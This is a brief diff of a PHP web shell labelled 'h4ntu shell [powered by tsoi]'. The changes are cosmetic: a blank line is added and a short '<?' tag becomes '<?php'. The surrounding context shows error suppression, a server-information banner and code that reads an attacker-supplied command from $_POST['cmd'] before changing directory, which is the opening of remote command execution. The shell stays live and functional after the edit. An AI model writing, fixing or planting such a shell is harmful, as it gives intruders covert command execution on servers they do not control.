@@ -1,5 +1,6 @@
 <?php
 error_reporting(0);
+
 echo "<title>h4ntu shell [powered by tsoi]</title>\n<p><font size=2 face=Verdana><b>This Is The Server Information</b></font></p>";
 
   closelog( );
@@ -63,7 +64,7 @@ echo "<title>h4ntu shell [powered by tsoi]</title>\n<p><font size=2 face=Verdana
 <hr color=777777 width=100% height=115px>
 
 <pre>
-<?
+<?php
 $cmd = $_POST['cmd'];
   if (isset($chdir)) @chdir($chdir);
   ob_start();
